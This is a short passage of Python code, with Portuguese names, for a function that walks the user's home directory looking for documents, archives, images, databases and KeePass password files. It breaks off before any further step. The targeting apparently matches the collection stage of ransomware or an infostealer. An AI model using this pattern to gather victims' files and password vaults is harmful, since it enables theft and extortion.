def buscar_arquivos():
    alvos = ('.docx', '.xlsx', '.pdf', '.txt', '.zip', '.rar', '.jpg', '.png', '.db', '.kdbx')
    arquivos = []
    for root, _, files in os.walk(os.path.expanduser('~')):
